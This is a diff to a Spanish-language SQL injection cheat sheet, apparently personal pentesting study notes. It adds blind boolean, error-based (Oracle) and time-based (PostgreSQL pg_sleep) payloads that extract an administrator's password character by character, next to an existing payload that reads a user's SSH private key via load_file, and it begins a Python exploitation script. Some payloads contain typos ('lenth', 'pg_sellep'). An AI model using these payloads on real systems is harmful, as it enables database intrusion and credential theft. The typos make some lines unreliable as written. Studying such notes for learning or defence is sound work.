@@ -166,12 +166,6 @@ Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre 
 ❯ ' union select load_file("/home/user/.ssh/id_rsa")-- -       # Leer el 'id_rsa' del usuario de la maquina victima
 ```
 
-## Inyecciones Blind con respuesta condicional 
-
--   **ExtendsClass MySQL Online**: [https://extendsclass.com/mysql-online.html](https://extendsclass.com/mysql-online.html)
-Cuando estas en una web a ciegas, tenemos dos formas de hacerlo, por **Tiempo** o **Boolean**.
-En las Blind también se pueden utilizar en sentencias SQL del tipo INSERT, DELETE, UPDATE, etc... 
-
 ## Blind Boolean
 
 ```bash 
@@ -198,9 +192,14 @@ En las Blind también se pueden utilizar en sentencias SQL del tipo INSERT, DELE
 ❯ and (select sleep(5) from <table_name> where substring(database(),1,1)='p' limit 0,1) 
 # Tardara 5 segundos si la primer letra de la primer DB es igual a 'p'
 	# limit 0,1 = Comparar con la primer DB
+
+❯ ' || pg_sleep(5) -- -                               # Inyeccion de tiempo para DB PostgreSQL
 ```
 
-## Blind
+## Inyecciones Blind con respuesta condicional 
+
+-   **ExtendsClass MySQL Online**: [https://extendsclass.com/mysql-online.html](https://extendsclass.com/mysql-online.html)
+Cuando estas en una web a ciegas, tenemos dos formas de hacerlo, por **Tiempo** o **Boolean**.
 
 ```bash 
 # Esto funciona cuando hay un error visual en la pagina web 
@@ -290,7 +289,18 @@ if __name__ == '__main__':
 ## Inyección Blind con error condicional 
 
 ```bash 
-# Esto es cuando miras un error '500 internal server error' o un '200 ok' cuando esta bien la consulta
+# Esto es cuando miras un error '500 internal server error' o un '200 ok' cuando esta bien la consulta en  Oracle
+
+❯ ' and (select 'a' from dual)='a'-- - 
+
+# Si es erroneo, entonces no se generara la division (error) y nos devolvera una 'a', por lo que a=a = True. Si cambiamos el numero 2 por 1, entonces si hara la division y no nos devolvera la 'a'.
+❯ ' and (select CASE when (1=2) then to_char(1/0) else 'a' end from dual)='a' -- -
+
+# Saber la longitud de la pasword es verdadera generara el error '500', cuando ya no sea verdadero es ahi cuando sabremos la longitud de la password, porque nos regresara un 'ok'
+❯ ' and (select CASE when lenth(password)>1 then to_char(1/0) else 'a' end from users where username='administrator')='a' -- -
+
+# Si la primer letra de la password es igual a 'a' genera el error '500', de lo contrario recibiremos un 'ok'
+❯ ' and (select CASE when substr(password,1,1)='a' then to_char(1/0) else 'a' end from users where username='administrator')='a' -- -
 ```
 
 ## Inyecciones sin ver el error en el Output 'Blind'
@@ -339,10 +349,26 @@ if __name__ == '__main__':
 
 ```
 
+## SQL BLIND Time
 
-## SQL Time con Python3
+```bash 
+# Obtener informacion con una SQL Time en PostgreSQL
+
+# Si el usuario se llama 'administrator' esperara 5 seg, de lo contrario no esperara nada 
+❯ ' ;select case when (username='administrator') then pg_sleep(5) else pg_sellep(0) end from users-- - 
+
+
+# Para extraer la longitud de la password, como si es verdad se tardara los 5 seg, de lo contrario no se tardara nada y es ahi cuando sabremos la longitud de la password
+❯ ' ;select case when (username='administrator' and length(password)>1) then pg_sleep(5) else pg_sellep(0) end from users-- - 
+
+
+# Obtener la password del usuario administrator, si la primer letra de la password es igual a 'a' tardara 5seg, de lo contrario no tardara nada 
+❯ ' ;select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(5) else pg_sellep(0) end from users-- -
+```
 
 ```python 
+# Para la base de datos MySQL
+
 #!/usr/bin/python3
 
 import requests
